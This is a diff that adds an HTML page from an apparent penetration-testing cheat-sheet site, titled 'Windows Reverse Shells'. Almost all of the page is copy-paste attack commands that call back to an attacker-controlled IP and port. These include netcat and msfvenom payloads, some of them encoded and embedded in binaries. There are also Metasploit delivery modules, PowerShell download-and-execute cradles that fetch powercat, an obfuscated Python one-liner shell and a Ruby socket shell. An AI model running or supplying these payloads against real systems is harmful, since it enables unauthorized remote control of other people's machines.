@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>CST</title>
+<link rel="icon" href="icon.ico">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="description" content="Cyber">
+<meta name="keywords" content="Hacking, Penetration Test, Vulnerability Assessment, Cyber, CTF, CST, CST">
+<style>
+body {
+  font-family: "Lato", sans-serif;
+  background-color: #191919;
+  color: #f1f1f1;
+  background-image: url('bg.jpg');
+  background-repeat: no-repeat;
+  background-attachment: fixed;
+  background-size: cover;
+}
+
+.sidenav {
+  height: 100%;
+  width: 0;
+  position: fixed;
+  z-index: 1;
+  top: 0;
+  left: 0;
+  background-color: #202124;
+  background-image: url('bg.jpg');
+  overflow-x: hidden;
+  transition: 0s;
+  padding-top: 20px;
+}
+
+.sidenav a {
+  padding: 1px 1px 1px 12px;
+  text-decoration: none;
+  font-size: 14px;
+  color: #818181;
+  display: block;
+  transition: 0s;
+}
+
+.sidenav a:hover {
+  color: #f1f1f1;
+}
+
+.sidenav .closebtn {
+  position: absolute;
+  top: 0;
+  right: 25px;
+  font-size: 36px;
+  margin-left: 50px;
+}
+
+.main {
+  margin-left: 160px; 
+  font-size: 20px; 
+  padding: 0px 10px;
+}
+
+.text.center {
+	text-align: center;
+}
+
+.bottomright {
+  position: fixed;
+  bottom: 0;
+  right: 0;
+  color: white;
+  padding: 10px 10px;
+  font-size: 30px; 
+}
+
+@media screen and (max-height: 450px) {
+  .sidenav {padding-top: 15px;}
+  .sidenav a {font-size: 12px;}
+}
+
+hr { 
+	display: block; 
+	height: 1px;
+    border: 0; 
+    border-top: 1px solid black;
+    margin: 1em 0; 
+    padding: 0; 
+}
+
+#rcorners {
+  border-radius: 15px;
+  background: #2e2d2e;
+  padding: 10px; 
+  width: 80%;
+  height: auto;  
+  word-wrap: break-word;
+}
+
+#divtitle {
+  height: auto;
+  width: 50%;
+}
+
+div.trans {
+  opacity: 0.6;
+}
+
+/*
+div {
+  border: double;
+}
+*/
+
+</style>
+</head>
+<body>
+<a name="top"></a>
+<div id="mySidenav" class="sidenav">
+  <a href="javascript:void(0)" class="closebtn" onclick="closeNav()">&times;</a>
+  <a href="index.html"><b>Home</a>
+  <hr>
+  <a href="nmap.html">Nmap</a>
+  <hr>
+  <a href="exploit.html">Search for exploits</a>
+  <hr>
+  <a href="brutef.html">Brute Force</a>
+  <hr>
+  <a href="hex.html">Hex and Headers</a>
+  <hr>
+  <a href="wrevshell.html">Windows Reverse Shells</a>
+  <hr>
+  <a href="lrevshell.html">Linux Reverse Shells</a>
+  <hr>
+  <a href="pel.html">Linux Penetration</a>
+  <hr>
+  <a href="pew.html">Windows Penetration</a>
+  <hr>
+  <a href="ctf.html">Mini-CTF</a>
+  <hr>
+  <a href="contact.html">Contact</b></a>
+  <hr>
+  <hr>
+</div>
+
+<div id="main">
+  <span style="font-size:30px;cursor:pointer" onclick="openNav()">&#9776;</span>
+</div>
+
+<center><div id="divtitle">
+<img src="logox.png" height=100px></img>
+<br>
+<br>
+<br>
+</div></center>
+
+<center><div id="rcorners" class="trans">
+  <h3>WINDOWS REVERSE SHELLS</h3>
+  <img src="search.png" width=200px>
+  <p>The following are ways to get reverse shells back to your red team device. All IP and PORT should be changed to your listening box</p>
+  <hr>
+  <h4 style="text-align: left">NC</h4>
+  <p style="text-align: left">nc.exe -e cmd.exe IP PORT</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom Standard meterpreter</h4>
+  <p style="text-align: left">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell_reverse.exe</p>
+  <p style="text-align: left">use exploit/multi/handler</p>
+  <p style="text-align: left">set payload windows/meterpreter/reverse_tcp</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom HTTPS Meterpreter</h4>
+  <p style="text-align: left">msfvenom -p windows/meterpreter/reverse_https LHOST=IP LPORT=443 -f exe -o met_https_reverse.exe</p>  
+  <hr>
+  <h4 style="text-align: left">Msfvenom non-staged payload</h4>
+  <p style="text-align: left">msfvenom -p windows/shell_reverse_tcp LHOST=IP LPORT=PORT -f exe -o shell_reverse_tcp.exe</p>
+  <p style="text-align: left">use exploit/multi/handler</p>
+  <p style="text-align: left">set payload windows/shell_reverse_tcp</p>  
+  <hr>
+  <h4 style="text-align: left">Msfvenom staged payload</h4>
+  <p style="text-align: left">msfvenom -p windows/shell/reverse_tcp LHOST=IP LPORT=PORT -f exe -o staged_reverse_tcp.exe</p>
+  <p style="text-align: left">use exploit/multi/handler</p>
+  <p style="text-align: left">set payload windows/shell/reverse_tcp</p>   
+  <hr>
+  <h4 style="text-align: left">Msfvenom payload in binary</h4>
+  <p style="text-align: left">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f exe -e x86/shikata_ga_nai -i 9 -x "/binary.exe" -o payload_binary.exe</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom PHP</h4>
+  <p style="text-align: left">msfvenom -p php/meterpreter_reverse_tcp LHOST=IP LPORT=IP -f raw > shell.php</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom ASP</h4>
+  <p style="text-align: left">msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f asp > shell.asp</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom WAR</h4>
+  <p style="text-align: left">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f war > shell.war</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom JSP</h4>
+  <p style="text-align: left">msfvenom -p java/jsp_shell_reverse_tcp LHOST=IP LPORT=PORT -f raw > shell.jsp</p>
+  <hr>
+  <h4 style="text-align: left">Msfvenom Batch File</h4>
+  <p style="text-align: left">Attacking machine: msfvenom -p cmd/windows/reverse_powershell lhost=IP lport=PORT > 1.bat</p>
+  <p style="text-align: left">Target box: powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://IP/1.bat'))</p>
+  <hr>
+  <h4 style="text-align: left">Metasploit Mshta.exe</h4>
+  <p style="text-align: left">use exploit/windows/misc/hta_server</p>
+  <p style="text-align: left">msf exploit(windows/misc/hta_server) > set srvhost IP</p>
+  <p style="text-align: left">msf exploit(windows/misc/hta_server) > set lhost IP</p>   
+  <p style="text-align: left">msf exploit(windows/misc/hta_server) > exploit</p>  
+  <hr>
+  <h4 style="text-align: left">Metasploit Rundll32.exe</h4>
+  <p style="text-align: left">use exploit/windows/smb/smb_delivery</p>
+  <p style="text-align: left">msf exploit(windows/smb/smb_delivery) > set srvhost IP</p>
+  <p style="text-align: left">msf exploit(windows/smb/smb_delivery) > exploit</p>   
+  <hr>
+  <h4 style="text-align: left">Metasploit Regsvr32.exe</h4>
+  <p style="text-align: left">use exploit/multi/script/web_delivery</p>
+  <p style="text-align: left">msf exploit (web_delivery)>set target 3</p>
+  <p style="text-align: left">msf exploit (web_delivery)> set payload windows/meterpreter/reverse_tcp</p>   
+  <p style="text-align: left">msf exploit (web_delivery)> set lhost IP</p>
+  <p style="text-align: left">msf exploit (web_delivery)>set srvhost IP</p>
+  <p style="text-align: left">msf exploit (web_delivery)>exploit</p>
+  <hr>
+  <h4 style="text-align: left">Powershell.exe</h4>
+  <p style="text-align: left">Attacking machine: git clone https://github.com/besimorhino/powercat.git</p>
+  <p style="text-align: left">Attacking machine: python -m SimpleHTTPServer 80</p>
+  <p style="text-align: left">Target box: powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://IP/powercat.ps1');powercat -c IP -p PORT -e cmd" </p> 
+  <hr>
+  <h4 style="text-align: left">Python</h4>
+  <p style="text-align: left">C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('IP', PORT)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+  </p>
+  <hr> 
+  <h4 style="text-align: left">Ruby</h4>
+  <p style="text-align: left">ruby -rsocket -e 'c=TCPSocket.new("[IP]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+  </p>
+  <hr>
+  
+</div></center>
+
+<a class="bottomright" href="#top" style="text-decoration: none; color: white;"><b>&#8682;</b></a>
+  
+<script>
+function openNav() {
+  document.getElementById("mySidenav").style.width = "250px";
+}
+
+function closeNav() {
+  document.getElementById("mySidenav").style.width = "0";
+}
+</script>
+
+</body>
+</html> 
